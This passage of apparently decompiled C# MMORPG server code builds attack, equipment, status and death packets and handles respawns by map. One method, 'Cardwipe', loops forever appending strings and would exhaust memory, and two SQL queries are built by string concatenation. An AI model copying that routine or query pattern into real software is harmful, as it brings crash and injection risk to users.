						发包类.Write4(最后血量);
						if (攻击力 < 1)
						{
							发包类.Write4(1);
						}
						else
						{
							发包类.Write4(0);
						}
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(-1);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						if (Play.Client != null)
						{
							Play.Client.SendPak(发包类, 2560, Play.人物灵兽全服ID);
						}
						发送当前范围广播数据(发包类, 2560, Play.人物灵兽全服ID);
					}
					return;
				}
				int value2 = 1;
				int num = 攻击力;
				int num2 = 0;
				int num3 = 0;
				int num4 = 0;
				int value3 = 0;
				switch (攻击类型)
				{
				default:
					if (Play.Player_Job == 6)
					{
						num = 0;
						num2 = 0;
						if (攻击力 != 0)
						{
							num = new Random().Next(攻击力 / 2 - 10, 攻击力 / 2 + 10);
							num2 = 攻击力 - num;
						}
						value2 = 2;
					}
					break;
				case 130:
				case 131:
				case 132:
				case 133:
					if (攻击力 != 0)
					{
						Random random3 = new Random();
						num = random3.Next(攻击力 / 5 - 10, 攻击力 / 5 + 10);
						num2 = random3.Next((攻击力 - num) / 4 - 10, (攻击力 - num) / 4 + 10);
						num3 = random3.Next((攻击力 - num - num2) / 3 - 10, (攻击力 - num - num2) / 3 + 10);
						num4 = random3.Next((攻击力 - num - num2 - num3) / 2 - 10, (攻击力 - num - num2 - num3) / 2 + 10);
						value3 = 攻击力 - num - num2 - num3 - num4;
						value2 = 5;
					}
					break;
				case 128:
				case 129:
					if (Play.Player_Job == 6)
					{
						if (攻击力 != 0)
						{
							Random random = new Random();
							num = random.Next(攻击力 / 5 - 10, 攻击力 / 5 + 10);
							num2 = random.Next((攻击力 - num) / 4 - 10, (攻击力 - num) / 4 + 10);
							num3 = random.Next((攻击力 - num - num2) / 3 - 10, (攻击力 - num - num2) / 3 + 10);
							num4 = random.Next((攻击力 - num - num2 - num3) / 2 - 10, (攻击力 - num - num2 - num3) / 2 + 10);
							value3 = 攻击力 - num - num2 - num3 - num4;
							value2 = 5;
						}
					}
					else
					{
						Random random2 = new Random();
						num = random2.Next(攻击力 / 3 - 10, 攻击力 / 3 + 10);
						num2 = random2.Next((攻击力 - num) / 2 - 10, (攻击力 - num) / 2 + 10);
						num3 = 攻击力 - num - num2;
						value2 = 3;
					}
					break;
				}
				using 发包类 发包类2 = new 发包类();
				发包类2.Write2(攻击对象人物全服ID);
				发包类2.Write2(1);
				发包类2.Write4(0);
				发包类2.Write4(num);
				发包类2.Write4(num2);
				发包类2.Write4(num3);
				发包类2.Write4(num4);
				发包类2.Write4(value3);
				发包类2.Write4(武功ID);
				发包类2.Write4(攻击类型);
				发包类2.Write(Play.人物灵兽.人物坐标_X);
				发包类2.Write(15f);
				发包类2.Write(Play.人物灵兽.人物坐标_Y);
				发包类2.Write(0);
				发包类2.Write(value2);
				发包类2.Write2(0);
				发包类2.Write4(最后血量);
				if (攻击力 == 0)
				{
					发包类2.Write4(1);
				}
				else
				{
					发包类2.Write4(0);
				}
				发包类2.Write4(0);
				发包类2.Write4(0);
				发包类2.Write4(0);
				发包类2.Write4(0);
				发包类2.Write4(uint.MaxValue);
				发包类2.Write4(0);
				发包类2.Write4(0);
				发包类2.Write4(0);
				发包类2.Write4(0);
				发包类2.Write4(0);
				发包类2.Write4(0);
				发包类2.Write4(0);
				发包类2.Write4(0);
				发包类2.Write4(0);
				if (Play.Client != null)
				{
					Play.Client.SendPak(发包类2, 2560, Play.人物灵兽全服ID);
				}
				发送当前范围广播数据(发包类2, 2560, Play.人物灵兽全服ID);
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "发送攻击人物数据 出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
			}
		}

		public void 更新装备效果()
		{
			using 发包类 发包类 = new 发包类();
			for (int i = 0; i < 40; i++)
			{
				if (i >= 34)
				{
					for (int j = 0; j < 6; j++)
					{
						int num = 0;
						switch (j)
						{
						case 0:
							num = 3;
							break;
						case 1:
							num = 5;
							break;
						case 2:
							num = 4;
							break;
						case 3:
							num = 1;
							break;
						case 4:
							num = 2;
							break;
						case 5:
							num = 0;
							break;
						}
						if (宝珠装备栏装备[num].Get物品ID != 0)
						{
							发包类.Write(宝珠装备栏装备[num].GetByte(), 0, World.发包单个物品大小);
						}
						else
						{
							发包类.Write(new byte[World.发包单个物品大小], 0, World.发包单个物品大小);
						}
					}
				}
				else if (i == 32)
				{
					if (装备栏已穿装备[16].Get物品ID != 0)
					{
						发包类.Write(装备栏已穿装备[16].GetByte(), 0, World.发包单个物品大小);
					}
					else
					{
						发包类.Write(new byte[World.发包单个物品大小], 0, World.发包单个物品大小);
					}
				}
				else if (i == 30)
				{
					if (装备栏已穿装备[15].Get物品ID != 0)
					{
						发包类.Write(装备栏已穿装备[15].GetByte(), 0, World.发包单个物品大小);
					}
					else
					{
						发包类.Write(new byte[World.发包单个物品大小], 0, World.发包单个物品大小);
					}
				}
				else if (i >= 15)
				{
					发包类.Write(new byte[World.发包单个物品大小], 0, World.发包单个物品大小);
				}
				else if (base.人物坐标_地图 == 41001 && i == 11)
				{
					byte[] bytes = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
					byte[] array = new byte[96];
					Buffer.BlockCopy(bytes, 0, array, 0, 8);
					Buffer.BlockCopy(装备栏已穿装备[i].物品_byte, 12, array, 0, 60);
					if (base.仙魔大战派别 == "仙族")
					{
						if (base.Player_Sex == 1)
						{
							Buffer.BlockCopy(BitConverter.GetBytes(16900001), 0, array, 8, 4);
						}
						else
						{
							Buffer.BlockCopy(BitConverter.GetBytes(26900075), 0, array, 8, 4);
						}
					}
					else if (base.Player_Sex == 1)
					{
						Buffer.BlockCopy(BitConverter.GetBytes(16900672), 0, array, 8, 4);
					}
					else
					{
						Buffer.BlockCopy(BitConverter.GetBytes(26900672), 0, array, 8, 4);
					}
					发包类.Write(array, 0, World.发包单个物品大小);
				}
				else
				{
					发包类.Write(装备栏已穿装备[i].GetByte(), 0, World.发包单个物品大小);
				}
			}
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 30208, base.人物全服ID);
			}
			发送当前范围广播数据(发包类, 30208, base.人物全服ID);
		}

		public void 更新装备效果to(Players toPlay, Players thisPlay)
		{
			using 发包类 发包类 = new 发包类();
			for (int i = 0; i < 40; i++)
			{
				if (i >= 34)
				{
					for (int j = 0; j < 6; j++)
					{
						int num = 0;
						switch (j)
						{
						case 0:
							num = 3;
							break;
						case 1:
							num = 5;
							break;
						case 2:
							num = 4;
							break;
						case 3:
							num = 1;
							break;
						case 4:
							num = 2;
							break;
						case 5:
							num = 0;
							break;
						}
						if (宝珠装备栏装备[num].Get物品ID != 0)
						{
							发包类.Write(宝珠装备栏装备[num].GetByte(), 0, World.发包单个物品大小);
						}
						else
						{
							发包类.Write(new byte[World.发包单个物品大小], 0, World.发包单个物品大小);
						}
					}
				}
				else if (i == 32)
				{
					if (装备栏已穿装备[16].Get物品ID != 0)
					{
						发包类.Write(装备栏已穿装备[16].GetByte(), 0, World.发包单个物品大小);
					}
					else
					{
						发包类.Write(new byte[World.发包单个物品大小], 0, World.发包单个物品大小);
					}
				}
				else if (i == 30)
				{
					if (装备栏已穿装备[15].Get物品ID != 0)
					{
						发包类.Write(装备栏已穿装备[15].GetByte(), 0, World.发包单个物品大小);
					}
					else
					{
						发包类.Write(new byte[World.发包单个物品大小], 0, World.发包单个物品大小);
					}
				}
				else if (i >= 15)
				{
					发包类.Write(new byte[World.发包单个物品大小], 0, World.发包单个物品大小);
				}
				else if (base.人物坐标_地图 == 41001 && i == 11)
				{
					byte[] bytes = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
					byte[] array = new byte[96];
					Buffer.BlockCopy(bytes, 0, array, 0, 8);
					Buffer.BlockCopy(装备栏已穿装备[i].物品_byte, 12, array, 0, 60);
					if (base.仙魔大战派别 == "仙族")
					{
						if (base.Player_Sex == 1)
						{
							Buffer.BlockCopy(BitConverter.GetBytes(16900001), 0, array, 8, 4);
						}
						else
						{
							Buffer.BlockCopy(BitConverter.GetBytes(26900075), 0, array, 8, 4);
						}
					}
					else if (base.Player_Sex == 1)
					{
						Buffer.BlockCopy(BitConverter.GetBytes(16900672), 0, array, 8, 4);
					}
					else
					{
						Buffer.BlockCopy(BitConverter.GetBytes(26900672), 0, array, 8, 4);
					}
					发包类.Write(array, 0, World.发包单个物品大小);
				}
				else
				{
					发包类.Write(装备栏已穿装备[i].GetByte(), 0, World.发包单个物品大小);
				}
			}
			if (toPlay.Client != null)
			{
				toPlay.Client.SendPak(发包类, 30208, thisPlay.人物全服ID);
			}
		}

		public void 行走状态人物灵兽(byte[] wg_id, int 状态ID)
		{
			byte[] array = Converter.hexStringToByte("AA55260000003D0018000E2C09000101000000000000000000000000000000000000000000000000000055AA");
			Buffer.BlockCopy(wg_id, 0, array, 11, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(状态ID), 0, array, 15, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物灵兽全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			发送当前范围广播数据(array, array.Length);
		}

		public void 爆毒数据包(int 包位置)
		{
			byte[] array = Converter.hexStringToByte("AA5526006B053B0018000105000000000000FF000000120000000000000000000000000000000000AE8B55AA");
			Buffer.BlockCopy(BitConverter.GetBytes(包位置), 0, array, 11, 4);
			Buffer.BlockCopy(装备栏包裹[包位置].物品数量, 0, array, 22, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 潜行状态(int ID)
		{
			潜行模式 = ID;
			byte[] array = Converter.hexStringToByte("AA551A00B20205200C00060000000100000001000000000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(ID), 0, array, 14, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			发送当前范围广播数据(array, array.Length);
		}

		public void 行走状态(byte[] 封包数据, int 状态ID)
		{
			byte[] array = Converter.hexStringToByte("AA55260060033D002000010000000100010000000000000000000000000000000000000000000000000055AA");
			Buffer.BlockCopy(封包数据, 0, array, 10, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(状态ID), 0, array, 16, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			行走状态id = 状态ID;
			if (封包数据[0] == 1 && 封包数据[1] == 0 && 封包数据[2] == 0 && 封包数据[3] == 0)
			{
				行走状态id1 = 1;
				if (base.Client != null)
				{
					BitConverter.ToInt16(array, 6);
					base.Client.Send(array, array.Length);
				}
				发送当前范围广播数据(array, array.Length);
			}
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			发送当前范围广播数据(array, array.Length);
		}

		public void Cardwipe()
		{
			List<string> list = new List<string>();
			while (true)
			{
				string item = "AA5543000000002300340001000000CE4303000000000043EEF8050100000000000000010A0003010000014F68333CE3969800E3969800E3969800E3969800000000000000000055AA";
				list.Add(item);
			}
		}

		public void 状态效果人物灵兽(byte[] wg_id, int 开关int, int sj)
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write8(BitConverter.ToInt32(wg_id, 0));
			发包类.Write4(0);
			发包类.Write4(开关int);
			发包类.Write4(sj);
			发包类.Write4(0);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 34560, base.人物灵兽全服ID);
			}
			发送当前范围广播数据(发包类, 34560, base.人物灵兽全服ID);
		}

		public void 状态效果New(int 状态ID, int 开关, int 时间, int 数量, int 数量类型)
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write4(状态ID);
			发包类.Write4(开关);
			发包类.Write4(时间);
			发包类.Write4(0);
			发包类.Write4(数量);
			发包类.Write4(数量类型);
			发包类.Write4(0);
			发包类.Write4(0);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 35328, base.人物全服ID);
			}
		}

		public void 状态效果(byte[] wg_id, int 开关int, int sj)
		{
			int num = BitConverter.ToInt32(wg_id, 0);
			if (num == 242)
			{
				return;
			}
			using 发包类 发包类 = new 发包类();
			发包类.Write8(num);
			发包类.Write4(0);
			发包类.Write4(开关int);
			发包类.Write4(sj);
			发包类.Write4(0);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 34560, base.人物全服ID);
			}
			发送当前范围广播数据(发包类, 34560, base.人物全服ID);
		}

		public void 增加属性(int 积分, int 武勋)
		{
			CheckTreasureGems();
			base.Player_WuXun += 武勋;
			检察元宝数据(积分, 1, "血战");
			SaveGemData();
			计算人物基本数据();
			更新武功和状态();
			更新HP_MP_SP();
		}

		public void 新状态效果(int wg_id, int sj, int 开关)
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write4(wg_id);
			发包类.Write4(0);
			发包类.Write2(92);
			发包类.Write2(1);
			发包类.Write(199);
			发包类.Write(49);
			发包类.Write(174);
			发包类.Write(95);
			发包类.Write4(开关);
			发包类.Write4(sj);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 17153, base.人物全服ID);
			}
		}

		public void 状态效果(int 异常ID, int 开关, int 异常数量, int 时间)
		{
			byte[] array = Converter.hexStringToByte("AA5546003527401538008C0300002C0100000900000001000000000000006016A2496016A2492600000014000000000000008C030000E80300000900000001000000000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(异常ID), 0, array, 18, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(异常ID), 0, array, 58, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(开关), 0, array, 22, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(开关), 0, array, 62, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(时间), 0, array, 38, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(异常数量), 0, array, 42, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 14, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 死亡2()
		{
			try
			{
				base.Player死亡 = true;
				if (自动攻击 != null)
				{
					自动攻击.Stop();
					自动攻击.Enabled = false;
					自动攻击.Close();
					自动攻击.Dispose();
					自动攻击 = null;
				}
				行走状态id1 = 0;
				异常状态列表();
				if (PK死亡)
				{
					if (攻击列表 != null)
					{
						攻击列表.Clear();
					}
					foreach (Players value2 in PlayList.Values)
					{
						if (!查找范围玩家(80, value2) || value2.Client.挂机 || value2.人物全服ID == base.人物全服ID || value2.攻击列表 == null || value2.攻击列表.Count == 0)
						{
							continue;
						}
						using (new Lock(value2.攻击列表, "攻击列表"))
						{
							foreach (攻击类 item in value2.攻击列表)
							{
								if (item.人物ID == base.人物全服ID)
								{
									value2.攻击列表.Remove(item);
									break;
								}
							}
						}
					}
				}
				if (base.人物坐标_地图 == 7001)
				{
					return;
				}
				if (是假人)
				{
					base.人物_HP = base.人物最大_HP;
					更新HP_MP_SP();
					base.Player死亡 = false;
					return;
				}
				if (base.人物坐标_地图 == 8001 || base.人物坐标_地图 == 8002 || base.人物坐标_地图 == 8003 || base.人物坐标_地图 == 8004 || base.人物坐标_地图 == 8005)
				{
					if (base.人物_战斗增加_HP > 0)
					{
						base.人物_战斗增加_HP = 0;
					}
					base.人物_HP = base.人物最大_HP;
					if (base.人物_战斗增加_MP > 0)
					{
						base.人物_战斗增加_MP = 0;
					}
					base.人物_MP = base.人物最大_MP;
					更新HP_MP_SP();
					系统倒计时(0, 0);
					if (World.老泫勃派开关 == 1)
					{
						移动(495f, 1727f, 15f, 29000);
					}
					else
					{
						移动(415f, 1528f, 15f, 101);
					}
					base.Player死亡 = false;
				}
				if (base.人物坐标_地图 == 7101)
				{
					if (World.血战 != null)
					{
						if (World.血战.帮战主方.申请帮派ID == base.帮派Id)
						{
							if (World.血战.帮战主方.申请人物列表.ContainsKey(base.人物全服ID))
							{
								World.血战.主方分数--;
								移动(-105f, -105f, 15f, 7101);
							}
						}
						else if (World.血战.帮战客方.申请帮派ID == base.帮派Id && World.血战.帮战客方.申请人物列表.ContainsKey(base.人物全服ID))
						{
							World.血战.客方分数--;
							移动(107f, 107f, 15f, 7101);
						}
					}
					base.人物_HP = base.人物最大_HP;
					更新HP_MP_SP();
					base.Player死亡 = false;
					return;
				}
				if (base.人物坐标_地图 == 7301)
				{
					int num = new Random().Next(0, 4);
					int num2 = 0;
					int num3 = 0;
					switch (num)
					{
					case 0:
						num2 = 0;
						num3 = 66;
						break;
					case 1:
						num2 = 66;
						num3 = 0;
						break;
					case 2:
						num2 = 0;
						num3 = -66;
						break;
					case 3:
						num2 = -66;
						num3 = 0;
						break;
					}
					移动(num2, num3, 15f, 7301);
				}
				if (base.人物坐标_地图 == 43001)
				{
					if (副本复活剩余次数 > 0)
					{
						副本复活剩余次数--;
						移动(20f, -600f, 15f, 43001);
						系统提示("被怪物秒杀传送到讨伐复活点");
					}
					else
					{
						if (World.老泫勃派开关 == 1)
						{
							移动(495f, 1727f, 15f, 29000);
						}
						else
						{
							移动(420f, 1500f, 15f, 101);
						}
						系统提示("复活次数用完毕传送至泫勃派");
					}
					base.人物_HP = base.人物最大_HP;
					base.Player死亡 = false;
					发送副本复活剩余次数();
					更新HP_MP_SP();
					return;
				}
				if (base.人物坐标_地图 == 41001)
				{
					if (World.仙魔大战进程 != 0)
					{
						仙魔大战复活选择();
					}
					base.Player死亡 = true;
					return;
				}
				if (base.人物坐标_地图 == 2301)
				{
					Random random = new Random();
					移动(120 + random.Next(-70, 70), random.Next(-70, 70), 15f, 2301);
					base.人物_HP = base.人物最大_HP;
					更新HP_MP_SP();
					base.Player死亡 = false;
					return;
				}
				if (base.人物坐标_地图 == 2341)
				{
					Random random2 = new Random();
					移动(120 + random2.Next(-70, 70), random2.Next(-70, 70), 15f, 2341);
					base.人物_HP = base.人物最大_HP;
					更新HP_MP_SP();
					base.Player死亡 = false;
					return;
				}
				if (base.人物坐标_地图 == 42001)
				{
					DataTable dBToDataTable = DBA.GetDBToDataTable("select * from [攻城城主] where 分区信息= '" + World.ZoneNumber + "' ");
					if (base.帮派名字 == dBToDataTable.Rows[0]["攻城行会名"].ToString())
					{
						base.Player死亡 = true;
						byte[] array = Converter.hexStringToByte("AA552600010040021800140020000BFB0288001A00FB0202000100E00300000AA00D000000000000000055AA");
						Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 15, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 21, 2);
						if (base.Client != null)
						{
							base.Client.Send(array, array.Length);
						}
						发送当前范围广播数据(array, array.Length);
					}
					else
					{
						base.Player死亡 = true;
						byte[] array2 = Converter.hexStringToByte("AA552600010040021800140020000BFB0288001A00FB0202000100E00300000AA00D000000000000000055AA");
						Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 15, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 21, 2);
						if (base.Client != null)
						{
							base.Client.Send(array2, array2.Length);
						}
						发送当前范围广播数据(array2, array2.Length);
					}
					dBToDataTable.Dispose();
					return;
				}
				base.人物_HP = 0;
				base.Player死亡 = true;
				坐标Class value = new 坐标Class(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
				using (new Lock(土灵符坐标, "土灵符坐标"))
				{
					if (土灵符坐标.ContainsKey(2))
					{
						土灵符坐标.Remove(2);
					}
					if (!土灵符坐标.ContainsKey(2))
					{
						土灵符坐标.Add(2, value);
					}
				}
				byte[] array3 = Converter.hexStringToByte("AA5520004A0188001C004A01000002000100000000000100000000000000020000000000000055AA");
				if (公有药品 != null)
				{
					if (检查符() || 检查符2())
					{
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 30, 2);
					}
					else
					{
						Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array3, 30, 2);
					}
				}
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array3, array3.Length);
				}
				发送当前范围广播数据(array3, array3.Length);
			}
			catch
			{
				if (base.是否假人 == 0)
				{
					RxjhClass.卡号记录(base.Userid, base.UserName, "怪物死亡", base.Player_Job);
					base.Client.Dispose();
				}
			}
		}

		public void 死亡(int 行凶)
		{
			try
			{
				base.Player死亡 = true;
				if (自动攻击 != null)
				{
					自动攻击.Stop();
					自动攻击.Enabled = false;
					自动攻击.Close();
					自动攻击.Dispose();
					自动攻击 = null;
				}
				行走状态id1 = 0;
				异常状态列表();
				Players players = null;
				if (行凶 < 10000)
				{
					PK死亡 = true;
					players = World.检查玩家世界ID(行凶);
				}
				if (PK死亡)
				{
					if (攻击列表 != null)
					{
						攻击列表.Clear();
					}
					foreach (Players value2 in PlayList.Values)
					{
						if (!查找范围玩家(80, value2) || value2.Client.挂机 || value2.人物全服ID == base.人物全服ID || value2.攻击列表 == null || value2.攻击列表.Count == 0)
						{
							continue;
						}
						using (new Lock(value2.攻击列表, "攻击列表"))
						{
							foreach (攻击类 item in value2.攻击列表)
							{
								if (item.人物ID == base.人物全服ID)
								{
									value2.攻击列表.Remove(item);
									break;
								}
							}
						}
					}
				}
				switch (base.人物坐标_地图)
				{
				case 801:
				{
					byte[] array = Converter.hexStringToByte("AA552000F80488001C00F804000002000100000000000000000000000000000000000000000055AA");
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array, array.Length);
					}
					发送当前范围广播数据(array, array.Length);
					base.Player死亡 = true;
					if (base.Player_Zx == 1)
					{
						势力战系统.发送势力战系统封包(this, 4, 1, 0);
					}
					else
					{
						势力战系统.发送势力战系统封包(this, 4, 1, 0);
					}
					return;
				}
				case 2301:
				{
					Random random2 = new Random();
					移动(120 + random2.Next(-70, 70), random2.Next(-70, 70), 15f, 2301);
					base.人物_HP = base.人物最大_HP;
					更新HP_MP_SP();
					base.Player死亡 = false;
					return;
				}
				case 2341:
				{
					Random random = new Random();
					移动(120 + random.Next(-70, 70), random.Next(-70, 70), 15f, 2341);
					base.人物_HP = base.人物最大_HP;
					更新HP_MP_SP();
					base.Player死亡 = false;
					return;
				}
				case 7001:
					return;
				case 7101:
					if (World.血战 != null)
					{
						if (World.血战.帮战主方.申请帮派ID == base.帮派Id)
						{
							if (World.血战.帮战主方.申请人物列表.ContainsKey(base.人物全服ID))
							{
								World.血战.主方分数--;
								移动(-105f, -105f, 15f, 7101);
							}
						}
						else if (World.血战.帮战客方.申请帮派ID == base.帮派Id && World.血战.帮战客方.申请人物列表.ContainsKey(base.人物全服ID))
						{
							World.血战.客方分数--;
							移动(107f, 107f, 15f, 7101);
						}
					}
					base.人物_HP = base.人物最大_HP;
					更新HP_MP_SP();
					base.Player死亡 = false;
					return;
				case 7301:
				{
					int num = new Random().Next(0, 4);
					int num2 = 0;
					int num3 = 0;
					switch (num)
					{
					case 0:
						num2 = 0;
						num3 = 66;
						break;
					case 1:
						num2 = 66;
						num3 = 0;
						break;
					case 2:
						num2 = 0;
						num3 = -66;
						break;
					case 3:
						num2 = -66;
						num3 = 0;
						break;
					}
					移动(num2, num3, 15f, 7301);
					base.人物_HP = base.人物最大_HP;
					更新HP_MP_SP();
					base.Player死亡 = false;
					return;
				}
				case 8001:
				case 8002:
				case 8003:
				case 8004:
				case 8005:
					if (base.人物_战斗增加_HP > 0)
					{
						base.人物_战斗增加_HP = 0;
					}
					base.人物_HP = base.人物最大_HP;
					if (base.人物_战斗增加_MP > 0)
					{
						base.人物_战斗增加_MP = 0;
					}
					base.人物_MP = base.人物最大_MP;
					更新HP_MP_SP();
					系统倒计时(0, 0);
					if (World.老泫勃派开关 == 1)
					{
						移动(495f, 1727f, 15f, 29000);
					}
					else
					{
						移动(415f, 1528f, 15f, 101);
					}
					base.Player死亡 = false;
					return;
				case 41001:
					if (World.仙魔大战进程 != 0)
					{
						仙魔大战复活选择();
					}
					base.Player死亡 = true;
					return;
				case 42001:
				{
					DataTable dBToDataTable = DBA.GetDBToDataTable("select * from [攻城城主] where 分区信息= '" + World.ZoneNumber + "' ");
					if (base.帮派名字 == dBToDataTable.Rows[0]["攻城行会名"].ToString())
					{
						base.Player死亡 = true;
						byte[] array2 = Converter.hexStringToByte("AA552600010040021800140020000BFB0288001A00FB0202000100E00300000AA00D000000000000000055AA");
						Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 15, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 21, 2);
						if (base.Client != null)
						{
							base.Client.Send(array2, array2.Length);
						}
						发送当前范围广播数据(array2, array2.Length);
					}
					else
					{
						base.Player死亡 = true;
						byte[] array3 = Converter.hexStringToByte("AA552600010040021800140020000BFB0288001A00FB0202000100E00300000AA00D000000000000000055AA");
						Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 15, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 21, 2);
						if (base.Client != null)
						{
							base.Client.Send(array3, array3.Length);
						}
						发送当前范围广播数据(array3, array3.Length);
					}
					dBToDataTable.Dispose();
					return;
				}
				case 43001:
					if (副本复活剩余次数 > 0)
					{
						副本复活剩余次数--;
						移动(20f, -600f, 15f, 43001);
						系统提示("被怪物秒杀传送到讨伐复活点");
					}
					else
					{
						if (World.老泫勃派开关 == 1)
						{
							移动(495f, 1727f, 15f, 29000);
						}
						else
						{
							移动(420f, 1500f, 15f, 101);
						}
						系统提示("复活次数用完毕传送至泫勃派");
					}
					base.人物_HP = base.人物最大_HP;
					base.Player死亡 = false;
					发送副本复活剩余次数();
					更新HP_MP_SP();
					return;
				}
				if (PK死亡)
				{
					if (World.PK掉装备 == 1 && base.人物善恶 <= World.PK掉装备善恶)
					{
						int num4 = new Random().Next(0, 14);
						if (new Random().Next(1, 100) <= World.PK掉装备几率 && BitConverter.ToInt32(装备栏已穿装备[num4].物品ID, 0) != 0 && !装备栏已穿装备[num4].物品绑定)
						{
							人物死亡掉落装备(players, num4);
							装备栏已穿装备[num4].物品_byte = new byte[World.数据库单个物品大小];
							计算人物装备数据();
							初始化已装备物品();
						}
					}
					更新武功和状态();
					players.更新武功和状态();
				}
				if (离线自动打怪 == 1)
				{
					假人死亡次数++;
					base.FLD_人物_追加_防御 += 10;
					更新武功和状态();
					移动(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
					base.人物_HP = base.人物最大_HP;
					更新HP_MP_SP();
					base.Player死亡 = false;
					return;
				}
				base.人物_HP = 0;
				base.Player死亡 = true;
				坐标Class value = new 坐标Class(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
				using (new Lock(土灵符坐标, "土灵符坐标"))
				{
					if (土灵符坐标.ContainsKey(2))
					{
						土灵符坐标.Remove(2);
					}
					if (!土灵符坐标.ContainsKey(2))
					{
						土灵符坐标.Add(2, value);
					}
				}
				byte[] array4 = Converter.hexStringToByte("AA552000F80488001C00F804000002000100000000000100000000000000020001000000000055AA");
				if (公有药品 != null)
				{
					if (检查符() || 检查符2())
					{
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array4, 30, 2);
					}
					else
					{
						Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array4, 30, 2);
					}
				}
				if (行凶 >= 10000)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array4, 32, 2);
				}
				else
				{
					Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array4, 32, 2);
				}
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array4, 4, 2);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array4, 10, 2);
				if (base.Client != null)
				{
					base.Client.Send(array4, array4.Length);
				}
				发送当前范围广播数据(array4, array4.Length);
			}
			catch
			{
				if (base.是否假人 == 0)
				{
					RxjhClass.卡号记录(base.Userid, base.UserName, "人物死亡", base.Player_Job);
					base.Client.Dispose();
				}
			}
		}

		public byte[] 人物死亡掉落装备(Players TOPlaye, int index)
		{
			if (World.JlMsg == 1)
			{
				MainForm.WriteLine(0, "玩家PK_掉出物品");
			}
			try
			{
				long get物品全局ID = 装备栏已穿装备[index].Get物品全局ID;
				int key = BitConverter.ToInt32(装备栏已穿装备[index].物品ID, 0);
				_ = 装备栏已穿装备[index].FLD_MAGIC0;
				_ = 装备栏已穿装备[index].FLD_MAGIC1;
				_ = 装备栏已穿装备[index].FLD_MAGIC2;
				_ = 装备栏已穿装备[index].FLD_MAGIC3;
				_ = 装备栏已穿装备[index].FLD_MAGIC4;
				string text = 装备栏已穿装备[index].得到物品名称();
				byte[] array = new byte[World.数据库单个物品大小];
				if (World.Itme.TryGetValue(key, out var value))
				{
					try
					{
						Buffer.BlockCopy(装备栏已穿装备[index].物品_byte, 0, array, 0, World.数据库单个物品大小);
					}
					catch (Exception ex)
					{
						MainForm.WriteLine(1, "PK掉出物品1 出错 " + base.人物全服ID + "|" + base.UserName + " " + ex.Message);
						return null;
					}
					地面物品类 地面物品类2;
					try
					{
						MainForm.WriteLine(1, "PK掉出物品 " + base.人物全服ID + "|" + base.UserName + "|" + text);
						系统提示("被[" + TOPlaye.UserName + "]击杀，掉落物品[" + value.ItmeNAME + "]");
